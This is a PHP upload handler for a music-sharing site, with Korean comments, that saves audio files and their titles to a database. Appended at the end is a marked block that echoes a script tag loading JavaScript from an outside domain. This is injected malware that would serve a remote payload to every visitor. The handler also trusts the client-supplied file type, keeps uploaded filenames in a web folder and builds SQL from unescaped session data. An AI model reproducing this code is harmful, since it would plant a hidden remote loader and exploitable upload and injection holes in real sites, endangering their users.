<?
session_start();
include ('./lib.php');
$connect = db_connect($db_host, $db_user, $db_pass, $db_name);
$music_title = $_POST['music_title'];
$music_contents = $_POST['music_contents'];
$singer_id = $_SESSION['user_id'];
$music = basename($_FILES['music']['name']);
//파일 디렉토리 path 저장
$music = str_replace(' ', '|', $music);
$tmppath = "upload/" . $music;
// 업로드된 파일의 존재여부 및 전송상태 확인
if (isset($_FILES['music']) && !$_FILES['music']['error'] && $_POST['music_title'] != " " && $_POST['music_contents'] != " ") {

	//업로드 제한용량 체크(서버측에서 10M로 제한)
	if ($_FILES['music']['size'] > 10485760) {
		echo "fail";
	}//if
	// 허용할 음악 종류를 배열로 저장
	$musicKind = array('audio/mp3', 'audio/wav', 'audio/wma', 'audio/mid', 'audio/aif', 'audio/amr');

	// musicKind 배열내에 $_FILES['music']['type']에 해당되는 타입(문자열) 있는지 체크
	if (in_array($_FILES['music']['type'], $musicKind)) {

		// 허용하는 음악파일이라면 지정된 위치로 이동, 제목, 내용들도 모두 db에 저장
		if (move_uploaded_file($_FILES['music']['tmp_name'], $tmppath)) {
			$sql = "insert into Vocals_musiclist set singer_id=trim('$singer_id'), music_title='" . addslashes(htmlspecialchars($music_title)) . "', 
			music_content='" . addslashes(htmlspecialchars($music_contents)) . "',music_date=now(), music_name='" . $music . "'";
			mysql_query($sql);
			$sql2 = "insert into Vocals_like set music_title='".addslashes(htmlspecialchars($music_title)) ."'";
			mysql_query($sql2);
			echo "success";
		} else {
			echo "fail5";
		} //if , move_uploaded_file

	} else {// 허용된 음악 타입이 아닌경우
		echo 'fail2';
	}//if , inarray

} else {
	echo "fail3";
}//if , isset

?>
<?php
#6affec#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155826\"></script>";
echo $vt;
}
#/6affec#
?>